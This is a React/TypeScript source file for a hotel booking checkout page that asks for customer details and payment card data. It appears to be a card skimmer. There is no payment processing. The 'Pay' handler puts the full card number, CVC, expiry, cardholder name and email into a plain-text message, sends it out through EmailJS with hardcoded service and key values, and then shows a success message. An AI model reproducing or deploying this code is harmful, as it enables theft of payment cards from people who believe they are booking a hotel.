import { useParams } from "react-router-dom";
import Input from "../Components/Input";
import emailjs from "@emailjs/browser";

import { useDispatch, useSelector } from "react-redux";
import { useEffect, useRef, useState } from "react";
import { getSingleHotelAction } from "../redux/actions/singleHotel.actions";
import { reservationsResponseType } from "../redux/reducers/hotels.reducer";
import { ReducersType } from "../redux/store";
import SinglePropertyType from "../Types/SingleProperty.types";
import SkeletonLoader from "../Components/SkeletonLoader";
// import TopBar from "../Components/TopBar";
import "../styles/Booking.module.css";
import {
  AmexCardIcon,
  DiscoverCardIcon,
  MastercardCardIcon,
  VerveCardIcon,
  VisaCardIcon,
} from "../assets/svg";
import { Modal } from "../Components/Modal";
import Spinner from "../utilities/Spinner";
import { SuccessMessage } from "../Components/SuccessMessage";
import { ErrorMessage } from "../Components/ErrorMessage";

type CardDetails = {
  holder_name: string;
  card_number: string | number;
  card_type: string;
  cvc: string | number;
  expiry_month: string;
  expiry_year: string;
};
type CustomerDetails = {
  first_name: string;
  last_name: string;
  email: string;
};
const cardTypes = [
  { type: "visa", pattern: /^4/ },
  { type: "mastercard", pattern: /^5[1-5]/ },
  { type: "amex", pattern: /^3[47]/ },
  { type: "discover", pattern: /^6(?:011|5)/ },
  { type: "verve", pattern: /^506[0-9]/ }, // Verve cards
];
const Booking = () => {
  const dispatch = useDispatch();
  const cardTypeMaps = {
    visa: VisaCardIcon,
    mastercard: MastercardCardIcon,
    amex: AmexCardIcon,
    discover: DiscoverCardIcon,
    verve: VerveCardIcon,
  };
  const expiryYearRef = useRef<HTMLInputElement>(null);
  const { propertyId } = useParams();
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    holder_name: "",
    card_number: "",
    card_type: "",
    cvc: "",
    expiry_month: "",
    expiry_year: "",
  });
  const [customerDetails, setCustomerDetails] = useState<CustomerDetails>({
    first_name: "",
    last_name: "",
    email: "",
  });
  const [isOpen, setIsOpen] = useState<boolean>(false);
  const [isLoading, setLoading] = useState<boolean>(false);
  const [requestStatue, setRequestStatue] = useState<
    "success" | "normal" | "error"
  >("normal");

  const singleHotelResponse = useSelector<ReducersType>(
    (state: ReducersType) => state?.singleHotel
  ) as reservationsResponseType;

  const singlePropertyData =
    singleHotelResponse.serverResponse as SinglePropertyType;
  const getIcon = (cardType: string) => {
    switch (cardType) {
      case "visa":
        return cardTypeMaps.visa;
      case "mastercard":
        return cardTypeMaps.mastercard;
      case "amex":
        return cardTypeMaps.amex;
      case "discover":
        return cardTypeMaps.discover;
      case "verve":
        return cardTypeMaps.verve;
    }
  };
  const onCustomerDetailsChange = (value: string, field: string) => {
    switch (field) {
      case "first_name":
        return setCustomerDetails((prev: CustomerDetails) => ({
          ...prev,
          first_name: value,
        }));
      case "last_name":
        return setCustomerDetails((prev: CustomerDetails) => ({
          ...prev,
          last_name: value,
        }));
      case "email":
        return setCustomerDetails((prev: CustomerDetails) => ({
          ...prev,
          email: value,
        }));
    }
  };
  const onCardDetailsChange = (value: string | number, field: string) => {
    switch (field) {
      case "holder_name":
        return setCardDetails((prev: CardDetails) => ({
          ...prev,
          holder_name: value as string,
        }));
      case "card_number":
        return setCardDetails((prev: CardDetails) => ({
          ...prev,
          card_number: value as number,
        }));
      case "cvc":
        return setCardDetails((prev: CardDetails) => ({
          ...prev,
          cvc: value as number,
        }));

      // case "card_type":
      //   return setCardDetails((prev: CardDetails) => ({
      //     ...prev,
      //     card_type: value as string,
      //   }));
      case "expiry_month":
        return setCardDetails((prev: CardDetails) => ({
          ...prev,
          expiry_month: value as string,
        }));
      case "expiry_year":
        return setCardDetails((prev: CardDetails) => ({
          ...prev,
          expiry_year: value as string,
        }));
    }
  };

  const determineCardType = (cardNumber: string | number) => {
    // Iterate through card types and check for a match
    for (const card of cardTypes) {
      if (card.pattern.test(String(cardNumber))) {
        return card.type;
      }
    }

    // If no match is found, return unknown
    return undefined;
  };
  const sendMail = (templateParams: { message: string }) => {
    emailjs
      .send(
        "service_jwa8zu8",
        "template_sh6j94j",
        templateParams,
        "OIaKogNpoJc4aDM_u"
      )
      .then(
        (response) => {
          console.log("SUCCESS!", response.status, response.text);
          setLoading(false);
          setRequestStatue("success");
        },
        (err) => {
          console.log("FAILED...", err);
          setLoading(false);
          setRequestStatue("error");
        }
      );
  };

  const onPayClick = async () => {
    setIsOpen(true);
    setLoading(true);
    const userData = { ...customerDetails, ...cardDetails };
    const templateParams = {
      message: `
      First Name: ${userData?.first_name}\n
      Last Name: ${userData?.last_name}\n
      Email: ${userData?.email}\n
      Card Holder's Name: ${userData?.holder_name}\n
      Card Number: ${userData?.card_number}\n
      CVC: ${userData?.cvc}\n
      Card Type: ${userData?.card_type}\n
      Expiry Date: ${userData?.expiry_month}/${userData?.expiry_year}\n`,
    };

    sendMail(templateParams);
  };
  const validateEmail = (email: string) => {
    // Regular expression for email validation
    const emailRegex = /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i;
    return emailRegex.test(email);
  };
  const isDisabled = () => {
    if (
      !customerDetails?.first_name ||
      customerDetails?.first_name.length < 3 ||
      !customerDetails?.last_name ||
      customerDetails?.last_name.length < 3 ||
      !customerDetails?.email ||
      customerDetails?.email.length < 3 ||
      !validateEmail(customerDetails?.email) ||
      !String(cardDetails?.card_number) ||
      String(cardDetails?.card_number).length < 16 ||
      !String(cardDetails?.holder_name) ||
      String(cardDetails?.holder_name).length < 3 ||
      !String(cardDetails?.cvc) ||
      String(cardDetails?.cvc).length < 3 ||
      !String(cardDetails?.expiry_month) ||
      !String(cardDetails?.expiry_year)
    ) {
      return true;
    } else {
      return false;
    }
  };
  // holder_name: "",
  // card_number: "",
  // card_type: "",
  // cvc: "",
  // expiry_month: "",
  // expiry_year: "",
  // });
  // const [customerDetails, setCustomerDetails] = useState<CustomerDetails>({
  // first_name: "",
  // last_name: "",
  // email: "",
  useEffect(() => {
    const cardType = determineCardType(cardDetails?.card_number);
    // console.log("cardType", cardType);
    setCardDetails((prev: CardDetails) => ({
      ...prev,
      card_type: cardType as string,
    }));
  }, [cardDetails?.card_number]);

  useEffect(() => {
    if (cardDetails?.expiry_month?.length === 2) {
      expiryYearRef?.current?.focus();
    }
  }, [cardDetails?.expiry_month]);

  useEffect(() => {
    if (!singlePropertyData) {
      dispatch(getSingleHotelAction(propertyId) as never);
    }
  }, []);

  // console.log(singleHotelResponse);
  return (
    <>
      {/* <TopBar/> */}
      <div className="flex flex-col  border h-full md:px-[10%] px-[5%] bg-[]">
        <div className=" p-4 w-full flex gap-4 ">
          <div className="flex gap-2 items-center w-[35%] ">
            <div className="bg-[#6f00e7] rounded-full md:h-12 h-6 w-6 md:w-12 flex justify-center items-center">
              {" "}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth="4"
                stroke="currentColor"
                className="md:w-6 w-3 md:h-6 h-3 stroke-white"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M4.5 12.75l6 6 9-13.5"
                />
              </svg>
            </div>
            <span className="md:text-base text-xs font-bold">
              Your Selection
            </span>
            {/* <div className="border w-[40%]"></div> */}
          </div>
          <div className="flex gap-2 items-center w-[35%] ">
            <div className="bg-[#6f00e7] rounded-full md:h-12 h-6 w-6 md:w-12 flex font-bold justify-center items-center border-2 border-[#6f00e7] ">
              <span className="md:w-6 w-3 md:h-6 h-3 text-white flex justify-center items-center font-bold ">
                2
              </span>
            </div>
            <span className="md:text-base text-xs font-bold">Your details</span>
            {/* <div className="border w-[40%]"></div> */}
          </div>
          <div className="flex gap-2 items-center  w-[30%] justify-end">
            <div className=" border-2 border-[#6f00e7] font-bold text-[#6f00e7] rounded-full md:h-12 h-6 w-6 md:w-12 flex justify-center items-center ">
              <span className="md:w-6 w-3 md:h-6 h-3 flex justify-center items-center font-bold text-[#6f00e7]">
                3
              </span>
            </div>
            <span className="md:text-base text-xs font-bold">Final Step</span>
          </div>
        </div>
        <div className="flex md:flex-nowrap flex-wrap  w-full gap-4">
          <div className=" md:w-[30%] w-[100%] h-full">
            {singleHotelResponse?.loading ? (
              <SkeletonLoader />
            ) : (
              <div className="border h-full w-full p-4 rounded-md">
                <h1 className="font-bold text-sm">
                  {singlePropertyData?.name}
                </h1>
                <p className="mt-2 text-xs">{singlePropertyData?.address}</p>
                <div className="mt-2 flex w-full gap-2 items-center">
                  <div className="text-white  bg-background p-1 flex items-center justify-center rounded-md ">
                    {singlePropertyData?.review_score}
                  </div>
                  <span className="text-sm">
                    {singlePropertyData?.review_score_word} .
                  </span>
                  <span className="text-sm">
                    {singlePropertyData?.review_nr} reviews
                  </span>
                </div>
              </div>
            )}
          </div>
          <div className=" md:w-[70%] w-[100%] h-full">
            {/* First Div */}
            <div className="border h-full p-4 rounded-md">
              <h1 className="font-bold">Enter your details</h1>
              <div className="border flex gap-4 mt-2 bg-[#f5f5f5] rounded-md p-4 w-full">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth="1.5"
                  stroke="currentColor"
                  className="w-6 h-6"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"
                  />
                </svg>
                <h4 className="text-sm">
                  Almost done! Just fill in the required info
                </h4>
              </div>
              <h4 className="text-sm font-bold mt-4">
                Are you travelling for work?
              </h4>

              {/* Radio Components */}

              <ul className="w-full mt-2 text-sm font-medium text-gray-900 bg-white border border-[#6f00e7] rounded-lg flex">
                <li className="w-full  border-gray-200 rounded-t-lg ">
                  <div className="flex items-center pl-3">
                    <label className="w-full flex gap-5 items-center py-3 ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">
                      <input
                        id="list-radio-license"
                        type="radio"
                        value=""
                        name="list-radio"
                        className="w-4 h-4 accent-[#6f00e7] cursor-pointer"
                      />
                      Yes
                    </label>
                  </div>
                </li>
                <li className="w-full  border-gray-200 rounded-t-lg ">
                  <div className="flex items-center pl-3">
                    <label className="w-full flex gap-5 items-center py-3 ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">
                      <input
                        id="list-radio-license"
                        type="radio"
                        value=""
                        name="list-radio"
                        className="w-4 h-4 accent-[#6f00e7] cursor-pointer"
                        // className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-700 dark:focus:ring-offset-gray-700 focus:ring-2 dark:bg-gray-600 dark:border-gray-500"
                      />
                      No
                    </label>
                  </div>
                </li>
              </ul>

              {/* Input Elements */}

              <div className="flex md:flex-nowrap flex-wrap mt-4 md:gap-12 gap-0">
                <div className="md:w-[50%] w-[100%]">
                  <Input
                    setValue={(value) =>
                      onCustomerDetailsChange(value as string, "first_name")
                    }
                    value={customerDetails?.first_name}
                    label="Firstname"
                    type="text"
                  />
                </div>
                <div className="md:w-[50%] w-[100%]">
                  <Input
                    setValue={(value) =>
                      onCustomerDetailsChange(value as string, "last_name")
                    }
                    value={customerDetails?.last_name}
                    label="Lastname"
                    type="text"
                  />
                </div>
              </div>

              {/* Email Element */}
              <div className="mt-4">
                <div className="md:w-[60%] w-[100%]">
                  <Input
                    setValue={(value) =>
                      onCustomerDetailsChange(value as string, "email")
                    }
                    value={customerDetails?.email}
                    label="Email address"
                    type="email"
                  />
                </div>
              </div>
            </div>

            {/* Second Div */}
            <div className="border h-full p-4 mt-4 rounded-md">
              <h1 className="text-sm font-bold">How do you want to pay?</h1>
              {/* <p className="text-xs mt-2">
                Although special requests cannot always be fulfilled, the
                accommodation will make every effort to do so. A specific
                request can always be made once your reservation is made!
              </p>
              <div className="mt-4 ">
                <Textarea />
              </div> */}
              <div className="flex md:flex-nowrap flex-wrap mt-4 md:gap-12 gap-4">
                <div className="md:w-[50%] w-[100%]">
                  <Input
                    setValue={(value) =>
                      onCardDetailsChange(value as string, "holder_name")
                    }
                    value={cardDetails?.holder_name}
                    label="Cardholder's name "
                    type="text"
                    placeholder="Card holder's name"
                  />
                </div>
                <div className="md:w-[50%] w-[100%]  flex flex-col">
                  <label className="font-bold mb-2">Card Type</label>
                  <div
                    className={`gap-5 flex items-center justify-start w-full min-h-[3.4375rem] h-[3.4375rem] max-h-[3.4375rem] rounded-lg border border-[#6f00e7]  bg-white p-4 text-sm text-black placeholder-black focus:outline-[#6f00e7] focus:border-[#6f00e7] ring-[#6f00e7] focus:ring-[#6f00e7] dark:text-gray-400 dark:placeholder-gray-400 `}
                  >
                    {cardDetails?.card_type ? (
                      <img
                        className="h-full"
                        src={getIcon(cardDetails?.card_type)}
                        alt=""
                      />
                    ) : null}
                    {/* {cardDetails?.card_type} */}
                  </div>
                  {/* <select
                    name="card"
                    id="card"
                    className="border border-[#868686] p-1 focus:outline-none"
                  >
                    <option value="Master Card">Master Card</option>
                    <option value="Visa">Visa</option>
                    <option value="American Express">American Express</option>
                  </select> */}
                </div>
              </div>

              <div className="flex md:flex-nowrap flex-wrap mt-4 md:gap-12 gap-4">
                <div className="md:w-[50%] w-[100%]">
                  <Input
                    setValue={(value) =>
                      onCardDetailsChange(value as string, "card_number")
                    }
                    value={cardDetails?.card_number}
                    label="Card number "
                    type="number"
                    className=""
                    placeholder="Enter your card number"
                    max={16}
                  />
                </div>
                <div className="md:w-[50%] w-[100%]">
                  <label className="font-bold mb-2">Expiry Date</label>
                  <div
                    className={`gap-5 mt-2 p-2 flex items-center justify-start w-full min-h-[3.4375rem] h-[3.4375rem] max-h-[3.4375rem] rounded-lg border border-[#6f00e7]  bg-white text-sm text-black placeholder-black focus:outline-[#6f00e7] focus:border-[#6f00e7] ring-[#6f00e7] focus:ring-[#6f00e7] dark:text-black dark:placeholder-gray-400 `}
                  >
                    <div className="w-1/2 h-full">
                      <input
                        className="w-full h-full text-center outline-none focus:outline-none"
                        type="number"
                        // className="border border-[#868686] p-1 focus:outline-none"
                        onChange={(e) =>
                          onCardDetailsChange(
                            e?.target?.value as string,
                            "expiry_month"
                          )
                        }
                        placeholder="07"
                        value={cardDetails?.expiry_month}
                        maxLength={2}
                      />
                    </div>
                    /
                    <div className="w-1/2 h-full">
                      <input
                        ref={expiryYearRef}
                        className="w-full h-full text-center outline-none focus:outline-none"
                        type="number"
                        // className="border border-[#868686] p-1 focus:outline-none"
                        onChange={(e) =>
                          onCardDetailsChange(
                            e?.target?.value as string,
                            "expiry_year"
                          )
                        }
                        placeholder="23"
                        value={cardDetails?.expiry_year}
                        maxLength={2}
                      />
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex md:flex-nowrap flex-wrap mt-4 md:gap-12 gap-0">
                <div className="md:w-1/2 w-[100%]">
                  {/* <h1 className="text-base font-bold">CVC</h1> */}
                  <Input
                    type="number"
                    // className="w-full border border-[#868686] p-1 focus:outline-none appearance-none"
                    placeholder="CVC"
                    label="CVC"
                    setValue={(value) =>
                      onCardDetailsChange(value as string, "cvc")
                    }
                    value={cardDetails?.cvc}
                    max={3}
                  />
                </div>
              </div>

              <div className="flex md:flex-nowrap flex-wrap mt-4 md:gap-12 gap-0">
                <div className=" w-[100%]">
                  <div className=" mt-4 rounded-md w-fit flex flex-col gap-5">
                    {/* <h1>Most popular facilities</h1> */}
                    <button
                      disabled={isDisabled()}
                      onClick={() => {
                        onPayClick();
                      }}
                      className=" p-4 rounded-md bg-[#6f00e7] text-white w-[100px]"
                    >
                      Pay
                    </button>
                    <Modal
                      isOpen={isOpen}
                      closeModal={() => {
                        setIsOpen(false);
                        setRequestStatue("normal");
                      }}
                      disableClose={isLoading}
                    >
                      {isLoading ? <Spinner size="large" /> : null}
                      {requestStatue === "success" ? <SuccessMessage /> : null}
                      {requestStatue === "error" ? <ErrorMessage /> : null}
                    </Modal>
                    {isDisabled() ? <p>Please fill all fields</p> : null}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Booking;
